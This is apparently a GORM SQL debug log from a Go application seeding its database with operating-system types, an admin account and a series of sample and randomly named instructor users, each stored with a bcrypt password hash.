2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:197
[0m[33m[5.757ms] [34;1m[rows:1][0m INSERT INTO "operating_system_types" ("created_at","updated_at","deleted_at","type") VALUES ('2025-06-09 14:07:49.566','2025-06-09 14:07:49.566',NULL,'macos') RETURNING "id"

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:197
[0m[33m[5.714ms] [34;1m[rows:1][0m INSERT INTO "operating_system_types" ("created_at","updated_at","deleted_at","type") VALUES ('2025-06-09 14:07:49.572','2025-06-09 14:07:49.572',NULL,'android') RETURNING "id"

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:197
[0m[33m[5.682ms] [34;1m[rows:1][0m INSERT INTO "operating_system_types" ("created_at","updated_at","deleted_at","type") VALUES ('2025-06-09 14:07:49.577','2025-06-09 14:07:49.577',NULL,'ios') RETURNING "id"

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:197
[0m[33m[9.109ms] [34;1m[rows:1][0m INSERT INTO "operating_system_types" ("created_at","updated_at","deleted_at","type") VALUES ('2025-06-09 14:07:49.583','2025-06-09 14:07:49.583',NULL,'other') RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[15.165ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:49.991','2025-06-09 14:07:49.991',NULL,'admin','admin','admin','admin','admin.admin@admin.com','+25199090909','$2a$12$2LolmAD3h.PUrN1J2IJMsuovMssxyU0ubryiTn1ZnJ74uW2T588l2',true,true,false) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/AdminModel.go:25
[0m[33m[2.043ms] [34;1m[rows:1][0m SELECT count(*) FROM "admins" WHERE "admins"."deleted_at" IS NULL

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.941ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 1 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/AdminModel.go:29
[0m[33m[15.918ms] [34;1m[rows:1][0m INSERT INTO "admins" ("created_at","updated_at","deleted_at","user_id") VALUES ('2025-06-09 14:07:50.01','2025-06-09 14:07:50.01',NULL,1) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[13.317ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:50.437','2025-06-09 14:07:50.437',NULL,'bob_jones4','Bob','Jones','D','bob.jones@example.com','+251911223377','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[27.536ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 2 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[34.468ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:50.478','2025-06-09 14:07:50.478',NULL,true,2) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.648ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:50.485','2025-06-09 14:07:50.485',NULL,'charlie_brown5','Charlie','Brown','E','charlie.brown@example.com','+251911223388','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.010ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 3 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[7.163ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:50.492','2025-06-09 14:07:50.492',NULL,true,3) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.926ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:50.498','2025-06-09 14:07:50.498',NULL,'david_clark6','David','Clark','F','david.clark@example.com','+251911223399','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.769ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 4 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[10.590ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:50.505','2025-06-09 14:07:50.505',NULL,true,4) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.962ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:50.515','2025-06-09 14:07:50.515',NULL,'gwkdqittnl','NhbowIU','ZkJHByE','ruAtU','instructor1@example.com','+100000000','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.751ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 5 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[13.254ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:50.522','2025-06-09 14:07:50.522',NULL,true,5) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.704ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:50.534','2025-06-09 14:07:50.534',NULL,'izziddeohe','IGWFbAF','yaoroAE','oSMuL','instructor2@example.com','+100000001','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.937ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 6 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[6.968ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:50.541','2025-06-09 14:07:50.541',NULL,true,6) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[13.083ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:50.55','2025-06-09 14:07:50.55',NULL,'kmbttfdobp','zIzYqem','hXKrOoP','VFGNJ','instructor3@example.com','+100000002','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[4.041ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 7 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[11.741ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:50.565','2025-06-09 14:07:50.565',NULL,true,7) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.869ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:50.573','2025-06-09 14:07:50.573',NULL,'ezhaywqcio','MewiLwc','FPvwrdL','wjHYY','instructor4@example.com','+100000003','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.465ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 8 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[6.889ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:50.579','2025-06-09 14:07:50.579',NULL,true,8) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[11.427ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:50.586','2025-06-09 14:07:50.586',NULL,'hbfkoregjx','ECUCOrN','dZmgeFG','PLQYu','instructor5@example.com','+100000004','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.427ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 9 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[5.993ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:50.597','2025-06-09 14:07:50.597',NULL,true,9) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[12.253ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:50.607','2025-06-09 14:07:50.607',NULL,'ojqxygcgpk','MRolavB','SmZDRBt','zFjWL','instructor6@example.com','+100000005','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.535ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 10 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[6.274ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:50.616','2025-06-09 14:07:50.616',NULL,true,10) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.728ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:50.622','2025-06-09 14:07:50.622',NULL,'xxxahkfbzn','IMXkRwr','MTUzxOu','GrhVQ','instructor7@example.com','+100000006','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.500ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 11 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[6.133ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:50.628','2025-06-09 14:07:50.628',NULL,true,11) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[7.842ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:50.636','2025-06-09 14:07:50.636',NULL,'rriuhxyviz','NFEXXbe','FGXHmCX','YNyMa','instructor8@example.com','+100000007','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.552ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 12 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[6.165ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:50.643','2025-06-09 14:07:50.643',NULL,true,12) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[11.344ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:50.654','2025-06-09 14:07:50.654',NULL,'gxhqufvdfj','HlGSxCl','PkJpGZE','Txuup','instructor9@example.com','+100000008','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.480ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 13 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[7.610ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:50.661','2025-06-09 14:07:50.661',NULL,true,13) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.615ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:50.668','2025-06-09 14:07:50.668',NULL,'gytsslmacb','etPRspA','FiPQeCF','ZvBsE','instructor10@example.com','+100000009','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.537ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 14 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[6.208ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:50.674','2025-06-09 14:07:50.674',NULL,true,14) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.638ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:50.68','2025-06-09 14:07:50.68',NULL,'idwqvgqutd','wDgSdTT','AjsdPlh','TFFBd','instructor11@example.com','+100000010','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.530ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 15 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[12.527ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:50.686','2025-06-09 14:07:50.686',NULL,true,15) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[13.194ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:50.699','2025-06-09 14:07:50.699',NULL,'dzthentcrj','xhPQgRv','vAXQnmz','QbCbV','instructor12@example.com','+100000011','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.521ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 16 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[7.434ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:50.712','2025-06-09 14:07:50.712',NULL,true,16) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[6.286ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:50.72','2025-06-09 14:07:50.72',NULL,'njiedfkmxm','eSlHbSq','CRbCKBu','cjQDc','instructor13@example.com','+100000012','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.511ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 17 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[6.792ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:50.727','2025-06-09 14:07:50.727',NULL,true,17) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.744ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:50.733','2025-06-09 14:07:50.733',NULL,'szxrsqjyta','jIOWMHL','FGVnSuS','ihsgR','instructor14@example.com','+100000013','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.474ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 18 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[7.423ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:50.739','2025-06-09 14:07:50.739',NULL,true,18) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[7.213ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:50.747','2025-06-09 14:07:50.747',NULL,'kkoatfeotl','pjkTUGX','NobcXyk','xTayT','instructor15@example.com','+100000014','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[3.089ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 19 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[11.240ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:50.757','2025-06-09 14:07:50.757',NULL,true,19) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.843ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:50.765','2025-06-09 14:07:50.765',NULL,'dazpyzgvtp','TakIkJu','aLKBBzY','SpJNa','instructor16@example.com','+100000015','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.492ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 20 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[8.708ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:50.774','2025-06-09 14:07:50.774',NULL,true,20) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[8.040ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:50.78','2025-06-09 14:07:50.78',NULL,'dcblbfeywu','btPuIEp','SDPMOwa','jbGuP','instructor17@example.com','+100000016','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.454ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 21 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[6.064ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:50.789','2025-06-09 14:07:50.789',NULL,true,21) RETURNING "id"

2025/06/09 14:07:50 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
